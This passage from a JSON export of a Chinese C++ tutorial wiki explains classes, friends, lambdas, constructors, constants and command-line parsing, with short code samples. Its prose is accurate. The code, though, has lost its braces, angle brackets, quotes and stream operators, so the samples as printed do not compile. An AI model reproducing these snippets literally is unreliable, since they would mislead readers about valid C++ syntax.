引用后可以继续调用同一对象的成员函数。 类与头文件组织类声明通常放在头文件，较长的非模板成员定义放在源文件以减少依赖和重编译。 在类定义内部定义的函数隐含 inline；模板成员定义则通常必须对实例化点可见。 类声明通常放在头文件，非模板且不需要内联的成员定义放在源文件。源文件首先包含自己的头文件，可以让声明与定义不一致尽早报错。私有成员仍会影响头文件依赖与 ABI，必要时才考虑 Pimpl 等额外间接层。 分离类声明与非内联实现 // counter.hpp#pragma onceclass Counterpublic: void increment(); int value() const;private: int m_value;;// counter.cpp#include counter.hppvoid Counter::increment() ++m_value; int Counter::value() const return m_value; 头文件暴露稳定声明，源文件保存非模板实现；需要使用该类的翻译单元只包含头文件。 嵌套类型类可以声明嵌套类、枚举和类型别名，它们位于类作用域并受访问控制约束。 嵌套类型不自动拥有外层对象引用，需要外层状态时必须显式保存或传入。 嵌套类型位于外层类作用域，可用 Outer::Type 限定访问，适合只服务该抽象的枚举、别名和辅助类。嵌套本身不会自动获得外层对象，也不缩短运行时生命周期。公开嵌套类型会成为类接口的一部分。 嵌套类型限定名称 #include iostreamclass Jobpublic: enum class State pending, done ; explicit Job(State state) : m_statestate State state() const return m_state; private: State m_state;;int main() std::cout (JobJob::State::done.state() == Job::State::done) ; Job::State 的名称位于类作用域中，调用方使用限定名访问；嵌套不自动授予外部类型实例访问权。 友元非成员函数friend 可以让指定非成员函数访问类的非 public 成员，同时该函数仍不是成员函数。 友元适合对称运算符和紧密协作函数，但大范围友元会削弱封装边界。 友元函数不是类成员，却获得访问该类私有与受保护成员的权限。它适合对称二元运算或与类紧密耦合的非成员接口。友元应保持小范围，不能用来绕过本可由公共操作维护的不变量。 友元函数访问受保护表示 #include iostreamclass Pointpublic: Point(int x, int y) : m_xx, m_yy friend std::ostream operator(std::ostream, const Point);private: int m_x; int m_y;;std::ostream operator(std::ostream out, const Point point) return out point.m_x , point.m_y; int main() std::cout Point2, 3 ; friend 只授予指定函数访问权限，不把它变成成员函数；不需要私有访问时应使用普通非成员函数。 友元类与友元成员函数类可以把另一个类或其特定成员函数声明为友元，授权是单向且不传递的。 声明特定友元成员函数需要正确安排前向声明和完整类定义顺序。 声明友元类会授予其所有成员访问权限，粒度较大；友元成员函数可以只开放单个操作，但声明依赖更复杂。友元关系不传递、不继承也不对称。能用窄公共接口协作时，通常无需扩大访问权限。 把友元权限限制到协作类型 #include iostreamclass Secret friend class Inspector; int value42;;class Inspectorpublic: int read(const Secret secret) const return secret.value; ;int main() std::cout Inspector.read(Secret) ; 友元类的成员可以访问 Secret 私有表示，但权限不传递、不继承，也不具有对称性。 引用限定符成员函数后的 或 限制它只能在左值或右值对象上调用。 引用限定符可以阻止从临时对象返回内部引用，也能为可消费对象提供移动优化接口。 成员函数的 和 引用限定符可以分别限制左值对象与右值对象调用。返回内部引用的访问器尤其需要这一边界：对临时对象返回引用会很快悬空，可以删除右值重载或让它按值返回。 引用限定符限制调用对象类别 #include iostreamclass Bufferpublic: int value() const return m_value; int value() = delete;private: int m_value7;;int main() Buffer buffer; std::cout buffer.value() ; const 重载只从持续存在的对象读取，删除 重载可阻止从临时对象取得危险借用。 参考资料 LearnCpp 15.1：隐藏的 this 指针与成员函数链 LearnCpp 15.2：类与头文件组织 LearnCpp 15.3：嵌套类型 LearnCpp 15.8：友元非成员函数 LearnCpp 15.9：友元类与友元成员函数 LearnCpp 15.10：引用限定符 cppreference：类的进一步使用相关条目","tags":[null,null]},{"title":"函数指针、递归、可变参数与 Lambda","path":"/wiki/cpp/cpp-topic-callables-and-lambdas.html","content":"函数指针保存普通函数入口，Lambda 生成可携带状态的闭包对象，递归则让函数通过调用栈重复处理子问题。C 风格省略号参数丢失类型信息，现代接口更适合使用模板参数包或明确的范围类型。 函数指针函数指针保存与特定签名匹配的函数地址，可用于回调和策略选择。 捕获 lambda 不能转换为普通函数指针；泛型接口通常使用函数模板或 std::function。 函数指针保存具有特定签名的函数地址，可为空并可作为回调传递。重载函数取地址时需要由目标类型消除歧义。无捕获 lambda 能转换为兼容函数指针；需要保存状态的可调用对象则用模板参数或 std::function 等包装。 函数指针实现策略选择 #include iostreamint add(int left, int right) return left + right; int multiply(int left, int right) return left * right; int apply(int left, int right, int (*operation)(int, int)) return operation(left, right); int main() std::cout apply(3, 4, multiply) ; 函数指针签名必须匹配；捕获 lambda 需要模板、std::function 或其他类型擦除接口。 递归递归函数通过更小子问题调用自身，并必须具有可到达的终止条件。 递归深度受实现资源限制；深线性递归在 C++ 中不能依赖尾调用优化，应考虑迭代写法。 递归函数必须有让问题规模趋向终止条件的路径，每层调用还会保存参数和局部状态。深度不受输入约束时可能耗尽调用栈。尾递归优化不是 C++ 保证，能够自然改写为循环或显式容器时可以控制资源上限。 递归和终止条件 #include iostreamunsigned long long factorial(unsigned value) if (value = 1) return 1; return value * factorial(value - 1);int main() std::cout factorial(5) ; 每次调用缩小 value 并最终到达终止条件；深递归和乘法溢出仍需单独限制。 省略号参数及其风险C 风格省略号不会保留参数数量和完整类型信息，并受默认实参提升规则影响。 现代 C++ 使用可变参数模板、span、initializer_list 或格式化库表达可检查接口。 C 风格省略号不会携带实参数量和类型，默认实参提升后只能依靠额外协议手工还原；协议一旦不一致就可能越界读取或用错误类型解释数据。可变参数模板、折叠表达式以及类型安全的格式化接口能够在编译期保留这些信息。 用可变参数模板替代 C 省略号 #include iostreamtemplate typename... Valuesvoid print_all(const Values... values) ((std::cout values ), ...); std::cout ;int main() print_all(1, 2.5, text); 可变参数模板保留每个实参的类型，折叠表达式自 C++17 起可用；C 风格省略号缺少数量和类型信息。 使用可变参数模板保留类型信息 template typename... Argsvoid log_values(Args... args) (std::cout ... std::forwardArgs(args)); 每个实参类型在实例化时可见，避免 C 风格省略号的手工协议。 C 风格省略号仍在语言中，但现代 C++ 通常以可变参数模板保留类型信息。 Lambda 表达式lambda 产生匿名闭包对象，参数列表和函数体定义调用行为。 无捕获 lambda 可转换为函数指针；泛型 lambda 的 auto 参数自 C++14 可用。 lambda 表达式产生一个匿名闭包类型，对象中保存按值捕获的状态，调用运算符实现函数体。无捕获 lambda 可以转换为兼容的函数指针；带捕获 lambda 需要以具体闭包类型、模板参数或 std::function 等类型擦除包装保存。 lambda 作为算法谓词 #include algorithm#include iostream#include vectorint main() const std::vector values1, 2, 3, 4; const auto even_countstd::count_if(values.begin(), values.end(), [](int value) return value % 2 == 0; ); std::cout even_count ; lambda 产生匿名闭包对象，适合把局部策略直接传给算法。 将筛选条件交给标准算法 const int minimum80;const auto passedstd::ranges::count_if(scores, [minimum](int score) return score = minimum;); Lambda 只捕获判断所需的最小状态，算法负责遍历范围。 捕获列表只保留回调所需状态；回调若会被保存，必须重新检查每个引用捕获和 this 的生命周期。 Lambda 捕获捕获列表决定闭包保存外部变量的副本或引用，默认捕获会隐藏实际依赖。 引用捕获不能超过目标生命周期；异步回调应明确捕获值、所有权或 weak_ptr。 按引用捕获只保存访问关系，不延长局部对象生命周期。回调被异步执行或存入容器时，按值捕获所需状态通常更容易审查；捕获 this 也只复制指针，不能保证当前对象在回调执行时仍存在。 显式捕获回调依赖 #include algorithm#include iostream#include vectorint main() const int minimum3; const std::vector values1, 3, 5; const auto countstd::count_if(values.begin(), values.end(), [minimum](int value) return value = minimum; ); std::cout count ; minimum 按值进入闭包，回调离开当前作用域后仍可使用副本；引用捕获需要额外保证来源生命周期。 异步保存时按值捕获所需状态 std::string messagedone;auto task = [message = std::move(message)] std::cout message ;; 闭包拥有移动后的字符串，不依赖创建作用域中的局部对象继续存活。 异步或延迟执行优先让闭包拥有所需值；共享可变状态还需要同步策略，按值捕获本身并不解决并发访问。 参考资料 LearnCpp 20.1：函数指针 LearnCpp 20.3：递归 LearnCpp 20.5：省略号参数及其风险 LearnCpp 20.6：Lambda 表达式 LearnCpp 20.7：Lambda 捕获 cppreference：函数进阶相关条目","tags":[null,null]},{"title":"类接口、const 成员与封装边界","path":"/wiki/cpp/cpp-topic-class-encapsulation.html","content":"类把状态和能够维护该状态的操作放在同一类型中。private 只限制直接访问，封装约束来自公开接口对不变量的维护；const 成员函数让只读对象也能被观察，同时阻止普通成员被意外修改。 面向对象程序设计面向对象设计把状态与维护该状态的操作组织为对象，并通过接口控制协作。 继承只是关系表达方式之一，值类型、组合和自由函数往往能形成更简单的模型。 面向对象设计把状态与维护该状态的操作放在同一抽象中，并通过接口隐藏不变量实现。它不是要求所有函数都成为成员，也不是继承层次越深越好。值类型、自由函数、组合和泛型常与类协同使用，应按依赖与所有权选择工具。 让对象维护自己的不变量 #include iostreamclass Counterpublic: void increment() ++m_value; int value() const return m_value; private: int m_value;;int main() Counter counter; counter.increment(); std::cout counter.value() ; 对象把状态和操作组合起来，调用方不直接依赖数据布局。 类class 定义用户类型并默认使用 private 访问权限，可以同时包含数据与操作。 类对象的有效状态由构造过程建立，公共成员函数应维护类不变量。 class 定义一种用户类型，每个对象拥有非静态数据成员，成员函数操作具体对象状态。默认 private 访问有助于收紧修改路径，但有效封装来自完整不变量和有意义的操作。只把字段加上 gettersetter 并不会自动形成良好抽象。 class 默认隐藏表示细节 #include iostreamclass Temperaturepublic: explicit Temperature(int celsius) : m_celsiuscelsius int value() const return m_celsius; private: int m_celsius;;int main() std::cout Temperature20.value() ; class 的 private 区域保存表示，public 函数构成调用方看到的契约。 成员函数非静态成员函数拥有隐式对象参数，可以访问当前对象的全部成员。 成员函数适合需要对象状态或不变量的操作，与对象无关的算法可保留为非成员函数。 非静态成员函数有一个隐式当前对象参数，成员访问实际通过它完成。成员函数应在需要访问不公开状态或表达对象操作时使用；与实例无关的算法可以保持为非成员函数，以减少类接口表面积并保留对称转换。 成员函数访问隐含对象 #include iostreamclass Counterpublic: void add(int amount) m_value += amount; int value() const return m_value; private: int m_value;;int main() Counter counter; counter.add(3); std::cout counter.value() ; counter.add(3) 会把 counter 作为隐含对象传给成员函数；const 成员函数承诺不修改可变状态。 const 对象与 const 成员函数const 对象只能调用 const 成员函数，后者承诺不通过普通成员访问修改对象。 逻辑 const 不等于逐字节不变，缓存等实现可使用 mutable，但不能破坏调用方可观察语义。 const 成员函数把当前对象视为 const，只能调用其他 const 成员或修改 mutable 状态。只读对象和 const 引用只能调用这类接口。成对重载访问器可以分别返回 T 与 const T，但返回引用会暴露生命周期和不变量边界。 const 对象只能调用 const 成员 #include iostreamclass Counterpublic: int value() const return m_value; private: int m_value3;;int main() const Counter counter; std::cout counter.value() ; const 成员函数不修改对象的逻辑状态，因此可以由 const 对象和 const 引用调用。 public、private 与访问说明符public 定义调用方可依赖的接口，private 隐藏表示细节，protected 还向派生类暴露。 访问控制发生在编译期，不能替代输入验证、权限控制或加密。 public 定义调用方可依赖的接口，private 限制实现状态的直接访问，protected 还把实现细节暴露给派生类。访问控制在编译期生效，不是安全隔离机制。最小公开接口能降低未来修改成本，也让合法状态变化更容易枚举。 用访问说明符分隔接口和表示 #include iostreamclass Accountpublic: explicit Account(int cents) : m_centscents int balance() const return m_cents; private: int m_cents;;int main() std::cout Account100.balance() ; public 成员是外部接口，private 成员只能由类实现访问；访问级别本身不改变对象布局。 访问函数访问函数为私有状态提供受控读取或修改入口，可以验证新值并保留更改表示的空间。 不应为每个成员机械生成 gettersetter；只有调用方确实需要的语义操作才进入接口。 访问函数适合暴露稳定观察结果，而不是机械映射每个成员。返回值可隔离内部表示，返回 const 引用可避免复制但绑定调用方到对象生命周期，返回可写引用则可能绕过所有校验。选择形式应从不变量和所有权推导。 访问函数返回受控视图 #include iostream#include string#include string_viewclass Userpublic: explicit User(std::string name) : m_namestd::move(name) std::string_view name() const return m_name; private: std::string m_name;;int main() std::cout UserAda.name() ; 访问函数可以返回 const 引用或 string_view，但返回的借用范围不能超过对象生命周期。 成员函数返回数据成员引用返回成员引用可以避免复制并允许链式或直接访问，但会暴露对象内部别名。 返回 const 引用仍受对象生命周期约束；返回可修改引用可能绕过不变量检查。 成员函数返回数据成员引用时，引用最多与当前对象及该成员同寿。对临时对象调用后保存引用会立即悬空，容器成员重分配也可能使引用失效。引用限定符可禁止危险的右值调用，或让右值重载按值返回。 返回成员引用时保留生命周期前提 #include iostreamclass Counterpublic: int value() return m_value; private: int m_value;;int main() Counter counter; counter.value() = 9; std::cout counter.value() ; 引用仍绑定到 counter 的成员；不能从临时对象或已销毁对象取得并保存该引用。 数据隐藏与封装封装把表示和不变量维护集中在类型内部，调用方只依赖稳定行为。 隐藏数据只有在接口限制状态转换时才有价值，简单把字段包进无条件 setter 并未建立边界。 封装把有效状态与允许操作集中在类型内部。构造函数建立不变量，公开成员只完成保持不变量的状态转换，观察函数不泄露可写内部引用。这样错误会在入口被拒绝，而不是在任意调用点检查散落字段组合。 在修改入口维护不变量 #include iostreamclass Boundedpublic: bool set(int value) if (value 0 || value 10) return false; m_value = value; return true; int value() const return m_value; private: int m_value;;int main() Bounded value; value.set(7); std::cout value.value() ; 调用方不能绕过 set 写入非法值；封装的价值在于把约束集中到少数修改入口。 用操作维护余额不变量 class Accountpublic: bool withdraw(int cents) if (cents = 0 || cents m_balance) return false; m_balance -= cents; return true; private: int m_balance;; 调用方不能绕过检查直接写余额，所有修改路径都经过同一不变量。 公开操作负责维护不变量，访问器只暴露调用方确实需要的观察结果；直接返回可写成员引用会绕过封装。 访问器不是封装的最终目标。能够用 deposit()、close() 这类操作表达状态变化时，接口比暴露可写引用更容易维持对象约束。 参考资料 LearnCpp 14.1：面向对象程序设计 LearnCpp 14.2：类 LearnCpp 14.3：成员函数 LearnCpp 14.4：const 对象与 const 成员函数 LearnCpp 14.5：public、private 与访问说明符 LearnCpp 14.6：访问函数 LearnCpp 14.7：成员函数返回数据成员引用 LearnCpp 14.8：数据隐藏与封装 cppreference：类相关条目","tags":[null,null]},{"title":"析构函数、类模板成员与静态成员","path":"/wiki/cpp/cpp-topic-class-lifetime-static.html","content":"析构函数负责对象离开生命周期时的清理，类模板成员则需要在实例化点保留可见定义。静态成员变量在对象之间共享状态，静态成员函数没有 this，只能直接访问类级状态。三者分别作用于生命周期、代码生成和对象归属。 概念索引 主题 规则边界 析构函数 析构函数在对象生命周期结束时执行，用于释放该对象拥有的资源。 带成员函数的类模板 类模板成员可以在类内或类外定义，类外定义需要重复模板参数列表和完整限定名。 静态成员变量 静态数据成员属于类而非单个对象，所有实例共享同一实体。 静态成员函数 静态成员函数没有 this 指针，只能直接访问静态成员，但仍位于类作用域并受访问控制约束。 析构函数析构函数默认应不抛出；使用标准容器和智能指针通常可以遵循 Rule of Zero。 析构函数在对象生命周期结束时运行，负责释放该对象拥有的资源。成员和基类会自动按逆序析构，因此资源成员通常不需要手写析构。自定义析构常意味着还要审查复制与移动操作，这正是零规则和五法则的联系。 析构函数与 RAII #include fstream#include iostreamvoid write_line() std::ofstream outputsample.txt; if (!output) return; output data ;int main() write_line(); std::cout closed by destructor ; ofstream 离开作用域时析构并关闭文件；优先组合标准 RAII 成员，通常无需手写析构函数。 带成员函数的类模板成员函数只在被使用时实例化，因此未使用成员的额外类型要求不会立即报错。 类模板成员可在类内定义，也可在类外用完整模板前缀和限定名定义。只有实际使用的成员通常才实例化，这允许某些成员拥有更强要求。C++20 requires 子句可把这些要求直接附着在对应成员上。 类模板成员函数 #include iostreamtemplate typename Tclass Accumulatorpublic: void add(const T value) m_total += value; const T total() const return m_total; private: T m_total;;int main() Accumulatorint sum; sum.add(3); sum.add(4); std::cout sum.total() ; 成员函数使用模板参数 T；调用时实例化要求 T 支持默认初始化和 +。 静态成员变量C++17 inline static 成员可以直接在类定义中初始化，避免单独源文件定义。 静态数据成员属于类而非每个对象，可用类名限定访问。C++17 的 inline 静态成员可在类定义中初始化并跨翻译单元表示同一实体。可变静态状态仍是全局共享状态，需要处理初始化、并发和测试隔离。 静态成员变量属于类而非单个对象 #include iostreamclass Ticketpublic: Ticket() : m_id++s_last_id int id() const return m_id; private: inline static int s_last_id; int m_id;;int main() std::cout Ticket.id() Ticket.id() ; inline static 成员在所有对象之间共享，普通成员 m_id 仍属于各自对象。 静态成员函数它适合作为与类型相关但不依赖实例状态的操作；纯算法也可以使用命名空间函数。 静态成员函数没有 this 指针，只能直接访问静态成员，但仍位于类作用域并受访问控制。它适合与类型紧密相关却不依赖实例状态的操作。若函数只使用公开接口且不需要访问权限，普通命名空间函数也可能更低耦合。 静态成员函数不接收 this #include iostreamclass Temperaturepublic: static double celsius_to_kelvin(double value) return value + 273.15; ;int main() std::cout Temperature::celsius_to_kelvin(20.0) ; 静态成员函数通过类名调用，不能直接访问非静态成员；它适合放置与类概念相关但不依赖对象状态的操作。 参考资料 LearnCpp 15.4：析构函数 LearnCpp 15.5：带成员函数的类模板 LearnCpp 15.6：静态成员变量 LearnCpp 15.7：静态成员函数 cppreference：类的进一步使用相关条目","tags":[null,null]},{"title":"命令行参数、完整解析与退出状态","path":"/wiki/cpp/cpp-topic-command-line.html","content":"命令行入口提供的是参数数量和字符串数组，不携带整数、路径或选项的业务语义。每个字段需要完整解析，数值要检查范围，互斥或依赖选项还要在解析后统一校验。退出状态则让脚本和调用进程区分成功与失败。 命令行参数托管环境下 main 可以接收 argc 和 argv，argv 元素是以空字符结尾的参数字符串。 参数仍需执行类型转换、范围和组合校验；复杂命令行应使用成熟解析库。 argc 给出参数数量，argv 提供以空字符结尾的字符串数组，具体编码与引号拆分受宿主平台影响。读取任意 argv[index] 前先检查数量，数值参数使用 from_chars 完整解析并继续验证范围。复杂选项交给成熟解析库。 校验命令行参数 #include charconv#include iostreamint main(int argc, char* argv[]) if (argc != 2) return 1; int value; const char* beginargv[1]; const char* endbegin + std::char_traitschar::length(begin); const auto resultstd::from_chars(begin, end, value); if (result.ec != std::errc || result.ptr != end) return 1; std::cout value ; argc 给出参数数量，argv 只提供字符串；from_chars 后还要检查是否消费完整参数和业务范围。 用 from_chars 校验整数参数 int value;const std::string_view textargv[1];const auto [end, error]std::from_chars(text.data(), text.data() + text.size(), value);if (error != std::errc || end != text.data() + text.size()) return 1; 同时检查错误码和末尾位置，避免只解析参数前缀后仍把整条输入视为有效。 每个参数先按完整字符串解析，再检查数值范围和选项组合；复杂命令行使用成熟解析库处理帮助文本、重复选项和平台差异。 从原始参数建立配置对象解析过程可以先构造临时配置，全部参数通过检查后再把结果交给业务逻辑。下面的程序支持一个端口参数和可选的详细输出开关；未知参数、重复端口、格式错误和越界值都走同一失败出口。 #include charconv#include iostream#include optional#include string_viewstruct Config int port; bool verbose;;std::optionalint parse_port(std::string_view text) int value; const auto [last, error] std::from_chars(text.data(), text.data() + text.size(), value) ; if (error != std::errc || last != text.data() + text.size()) return std::nullopt; if (value 1 || value 65535) return std::nullopt; return value;std::optionalConfig parse_arguments(int argc, char* argv[]) Config config; bool has_port; constexpr std::string_view port_prefix--port=; for (int index1; index argc; ++index) const std::string_view argumentargv[index]; if (argument == --verbose) config.verbose = true; else if (argument.starts_with(port_prefix) !has_port) const auto portparse_port(argument.substr(port_prefix.size())); if (!port) return std::nullopt; config.port = *port; has_port = true; else return std::nullopt; if (!has_port) return std::nullopt; return config;int main(int argc, char* argv[]) const auto configparse_arguments(argc, argv); if (!config) std::cerr usage: app --port=1-65535 [--verbose] ; return 2; std::cout port= config-port verbose= std::boolalpha config-verbose ; argc 和 argv 的拆分结果由宿主环境提供，尤其是引号、反斜杠和字符编码规则具有平台差异。程序内部仍可把每个已经拆分的参数当作完整字符串处理，并把退出码约定为调用接口的一部分。 失败位置 应检查的条件 参数读取 数量、未知选项、重复选项 字符串转换 错误码、是否消费到末尾 业务范围 端口、文件大小或数量上限 参数组合 必选项、互斥项、依赖项 参数数量很少时可以直接解析；命令行发展出子命令、短选项、重复参数和自动帮助后，成熟解析库更容易维持跨平台行为。 参考资料 LearnCpp 20.4：命令行参数 cppreference：函数进阶相关条目","tags":[null,null]},{"title":"常量、字面量与编译期求值","path":"/wiki/cpp/cpp-topic-constants.html","content":"const 描述通过当前接口不可修改，constexpr 进一步要求初始化器可用于常量表达式。字面量的写法决定初始类型，所在语境再决定表达式是否必须在编译期求值。编译器可以依据 as-if 规则优化程序，但优化不会为未定义行为补上语言保证。 概念索引 主题 规则边界 常量变量 const 对象初始化后不能通过该名称修改，适合表达运行期确定但之后保持不变的值。 字面量 整型、浮点、字符和字符串字面量拥有由写法与后缀决定的类型。 十进制、二进制、十六进制与八进制 整数前缀 0b、0x 和前导 0 分别表示二进制、十六进制和八进制。 as-if 规则与编译期优化 as-if 规则允许实现进行任何不改变可观察行为的优化，常量折叠只是其中一种。 常量表达式 常量表达式能够在编译期求值，并可用于数组边界、模板参数和 static_assert 等语境。 constexpr 变量 constexpr 变量必须由常量表达式初始化，并且隐含 const。 常量变量const 不等同于编译期常量；是否可用于常量表达式还取决于类型、初始化器和语言规则。 const 限制通过当前名称修改对象，不自动让对象成为编译期常量，也不保证其他别名无法修改底层对象。接口中的 const T 表达只读借用，成员函数后的 const 则约束通过 this 修改当前对象的方式。 运行期确定的只读值 #include iostreamint read_limit() return 10;int main() const int limitread_limit(); std::cout limit ; limit 运行期初始化后保持不变；const 不自动表示可用于模板参数的编译期常量。 字面量用户定义字面量可以扩展单位表达，但公共接口应避免含义不清或与标准后缀冲突的命名。 字面量自身有类型：普通整数会按可表示范围选择候选类型，浮点字面量默认是 double，字符与字符串前缀决定代码单元类型。后缀应在值可表示的前提下表达意图，不能用强制后缀掩盖越界。 字面量后缀决定类型 #include iostreamint main() const auto count42u; const auto rate2.5f; std::cout count rate ; u 和 f 分别影响整型与浮点字面量类型；公共单位也可以通过用户定义字面量表达。 十进制、二进制、十六进制与八进制数字分隔符可以提高可读性；普通业务数值应避免前导零，以免被误解为八进制。 进制前缀只改变整数记号的解释，不改变值的数学含义。二进制适合位掩码，十六进制便于观察字节和字段，普通数量仍以十进制最直观。数字分隔符不会参与数值，可按协议字段或三位分组提高可读性。 使用进制和数字分隔符表达协议字段 #include iostreamint main() const unsigned mask0b11110000; const unsigned opcode0x2a; std::cout (mask | opcode) ; 0b、0x 和前导 0 分别选择二进制、十六进制和八进制；普通十进制数不要添加无意的前导零。 as-if 规则与编译期优化优化不改变未定义行为的性质；不能依据反汇编中的偶然结果推断源程序具有保证。 as-if 规则允许实现删除中间对象、折叠常量和重排指令，只要单线程程序的可观察行为保持符合标准。它不为未定义行为提供保护，也不保证源语句对应固定汇编。需要阻止特定优化时，必须依靠语言规定的可观察操作或平台接口。 优化必须保留可观察行为 #include iostreamint main() const int value3 * 7; std::cout value ; 实现可以在编译期折叠 3 * 7，只要可观察输出和其他受标准约束的行为不变。 常量表达式编译期可求值不代表表达式一定在编译期执行，具体要求由所在语境决定。 常量表达式是在规定语境中能够由编译器求值的表达式，可用于 static_assert、非类型模板参数和需要编译期值的初始化。一个 constexpr 函数也可以在运行期调用；是否必须编译期求值由调用所在语境决定。 把编译期约束写成 static_assert #include array#include iostreamconstexpr int slots4;static_assert(slots 0);int main() std::arrayint, slots values; std::cout values.size() ; 常量表达式在需要编译期值的语境中求值；普通运行期表达式不因为写法相似就自动提前执行。 constexpr 变量constexpr 适合表达编译期可用的值；仅需运行期只读语义时 const 更准确。 constexpr 变量必须由常量表达式初始化，并隐含顶层 const。它适合维度、查找表和编译期分支所需的值；只要求对象初始化后不再修改，而初值来自运行期时，普通 const 更准确。 constexpr 变量参与编译期计算 #include array#include iostreamconstexpr std::size_t width3;constexpr std::size_t height2;int main() std::arrayint, width * height cells; std::cout cells.size() ; constexpr 变量隐含 const，并要求初始化器满足常量表达式规则。 参考资料 LearnCpp 5.1：常量变量 LearnCpp 5.2：字面量 LearnCpp 5.3：十进制、二进制、十六进制与八进制 LearnCpp 5.4：as-if 规则与编译期优化 LearnCpp 5.5：常量表达式 LearnCpp 5.6：constexpr 变量 cppreference：常量与字符串相关条目","tags":[null,null]},{"title":"构造、复制、转换与复制消除","path":"/wiki/cpp/cpp-topic-constructors-and-copy.html","content":"对象的初始状态由成员声明、成员初始化列表和构造函数重载共同决定。复制构造描述从同类型对象建立新对象，转换构造允许其他类型参与初始化，explicit 控制隐式转换入口；复制消除则可能让源代码中的临时对象不实际产生。 构造函数构造函数在对象生命周期开始时初始化对象，没有返回类型，并可通过重载提供不同建立方式。 构造完成后对象应满足不变量；无法建立有效对象时需要拒绝构造或使用工厂结果类型。 构造函数负责把对象直接带入有效状态，没有返回类型。资源取得或参数校验失败时可以抛出异常，使对象不进入生命周期；能用类型或工厂表达普通失败时也可选择结果类型。构造体内赋值通常晚于成员初始化，应优先初始化列表。 构造函数建立有效初始状态 #include iostreamclass Portpublic: explicit Port(int value) : m_valuevalue int value() const return m_value; private: int m_value;;int main() std::cout Port8080.value() ; 构造函数在对象可用前初始化成员；explicit 防止整数被意外转换成 Port。 构造函数成员初始化列表成员初始化列表在进入构造函数体前初始化基类和成员。 实际初始化顺序由成员声明顺序决定而非列表顺序，const、引用和无默认构造成员必须在列表中初始化。 成员初始化列表在构造函数体前初始化基类和成员，实际顺序固定为基类及成员声明顺序，与列表书写顺序无关。const、引用和不可默认构造成员必须在这里给出初值。列表顺序应与声明顺序一致，避免依赖尚未初始化的成员。 初始化列表按成员声明顺序生效 #include iostreamclass Rectanglepublic: Rectangle(int width, int height) : m_widthwidth, m_heightheight int area() const return m_width * m_height; private: int m_width; int m_height;;int main() std::cout Rectangle4, 3.area() ; 成员初始化顺序由声明顺序决定，不由初始化列表书写顺序决定；引用和 const 成员必须在此处初始化。 默认构造函数与默认实参无参数可调用的构造函数是默认构造函数，可以由编译器生成、显式 default 或用户定义。 声明其他构造函数会影响隐式默认构造，接口应明确类型是否允许默认状态。 能够无实参调用的构造函数是默认构造函数，可能由编译器生成、显式 = default 或由全部默认实参形成。只有当“默认状态”本身有效时才提供它；否则要求调用方给出建立不变量所需的数据更准确。 默认构造函数提供可用默认值 #include iostreamclass Retrypublic: explicit Retry(int count = 3) : m_countcount int count() const return m_count; private: int m_count;;int main() std::cout Retry.count() ; 默认实参允许 Retry{} 构造默认对象；是否允许空状态仍取决于类的不变量。 委托构造函数委托构造允许一个构造函数调用同类的另一个构造函数，集中公共初始化逻辑。 一个构造函数要么委托，要么直接初始化成员，委托链不能形成循环。 委托构造让同一类的一个构造函数调用另一个构造函数，公共初始化只维护一份。委托目标必须是该初始化列表的唯一类初始化器，完成后才执行委托者函数体。它适合共享默认值，不应形成难以追踪的构造链。 委托构造函数集中默认逻辑 #include iostreamclass Userpublic: User() : Userguest, 0 User(const char* name, int id) : m_namename, m_idid int id() const return m_id; private: const char* m_name; int m_id;;int main() std::cout User.id() ; 委托构造函数只能委托给同一类的另一个构造函数，避免多个入口重复初始化规则。 临时类对象临时对象常由 prvalue、转换和返回值产生，其生命周期通常到完整表达式结束。 C++17 保证部分场景直接构造目标对象，减少对可见复制或移动构造的需求。 临时对象通常存活到创建它的完整表达式结束，随后析构。绑定到特定局部 const 引用可以延长生命周期，但通过函数参数或返回引用并不会任意延长。链式调用若返回内部引用，也要确认所有者不是即将销毁的临时对象。 临时对象延续到完整表达式结束 #include iostreamstruct Token int value; ~Token() std::cerr destroy ; ;int main() std::cout Token7.value ; Token{7} 是临时对象，通常在包含它的完整表达式结束时销毁；不要保存指向其成员的借用。 复制构造函数复制构造函数从同类型对象初始化新对象，典型签名接受 const T。 资源所有者需要深复制、禁止复制或改用标准 RAII 成员；普通值类型优先让编译器生成。 复制构造从同类型对象建立新对象，通常接收 const T。值成员和标准容器会自然深复制自身状态；独占资源成员会删除复制。类型应明确选择值语义、独占不可复制或显式 clone，而不是让裸指针获得偶然浅复制。 复制构造建立独立值对象 #include iostreamclass Pointpublic: Point(int x, int y) : m_xx, m_yy int x() const return m_x; private: int m_x; int m_y;;int main() const Point first2, 3; const Point copyfirst; std::cout copy.x() ; 如果成员具有值语义，编译器生成的复制构造通常足够；资源句柄需要额外定义复制策略。 类初始化与复制消除复制初始化会参与转换和重载解析，但不等同于一定执行复制构造。 C++17 在部分 prvalue 场景保证复制消除，返回局部对象时通常直接 return value。 复制消除允许或要求编译器直接在最终存储位置构造对象。C++17 起某些纯右值初始化不再产生需要复制的中间临时对象，即使复制构造被删除也能成立。命名返回值优化仍有条件，类型依然应在不依赖可选优化时保持合理移动语义。 返回值可直接构造到目标对象 #include iostreamstruct Result int value; ;Result make_result() return Result42; int main() const Result resultmake_result(); std::cout result.value ; C++17 对某些 prvalue 场景提供强制复制消除；不要把观察构造次数当成接口契约。 转换构造函数与 explicit可由单个实参调用的构造函数可能参与隐式转换，explicit 可以限制这种转换。 C++11 起 explicit 可用于多参数构造，只要默认实参使其能以单个实参调用；C++20 支持条件 explicit。 单参数构造和转换运算符可能参与隐式转换，explicit 要求调用方在普通初始化与传参中明确表达转换。C++20 支持条件 explicit，使模板根据实参属性决定转换是否隐式。领域类型通常默认阻止意外单位或状态转换。 explicit 保护转换边界 #include iostreamclass Portpublic: explicit Port(int value) : m_valuevalue int value() const return m_value; private: int m_value;;int main() std::cout Port8080.value() ; explicit 构造函数只能在显式构造语境使用，避免 Port port 8080 一类的隐式转换。 constexpr 聚合与类字面类型对象可以在常量表达式中构造和操作，constexpr 构造函数与成员函数建立编译期可用接口。 同一 constexpr 函数也可以在运行期执行，除非处于必须常量求值的语境或使用 consteval。 字面类型的构造与成员函数可以参与常量求值，但同一函数也可在运行期执行。C++20 扩展了常量求值能力，使容器和算法更多操作可在编译期使用。constexpr 不替代运行期验证，只保证满足条件的调用可以被编译期求值。 constexpr 类对象参与编译期计算 #include iostreamstruct Size int width; int height; constexpr int area() const return width * height; ;constexpr Size size4, 3;static_assert(size.area() == 12);int main() std::cout size.area() ; constexpr 成员函数允许在常量表达式上下文中求值，但同一函数也可以在运行期调用。 参考资料 LearnCpp 14.9：构造函数 LearnCpp 14.10：构造函数成员初始化列表 LearnCpp 14.11：默认构造函数与默认实参 LearnCpp 